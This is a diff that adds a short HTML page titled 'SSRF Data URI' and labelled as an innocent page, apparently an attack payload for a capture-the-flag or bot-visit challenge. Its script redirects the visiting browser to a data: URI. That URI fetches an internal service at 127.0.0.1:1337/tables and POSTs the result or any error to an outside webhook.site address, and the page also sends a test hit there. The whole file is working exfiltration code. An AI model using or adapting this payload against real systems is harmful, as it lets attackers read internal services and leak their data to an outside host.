@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Data URI</title>
+</head>
+<body>
+    <h1>Innnocent page</h1>
+    <script>
+        const webhook = 'https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84';
+        const script = `
+            fetch('http://127.0.0.1:1337/tables')
+                .then(res => res.text())
+                .then(data => {
+                    fetch('${webhook}', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: 'tables=' + encodeURIComponent(data)
+                    });
+                })
+                .catch(err => {
+                    fetch('${webhook}', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: 'error=' + encodeURIComponent(err.message)
+                    });
+                });
+        `;
+        window.location = 'data:text/html,<script>' + encodeURIComponent(script) + '<\/script>';
+        
+        // Test hit
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'test=DataURIAttempt'
+        });
+    </script>
+</body>
+</html>
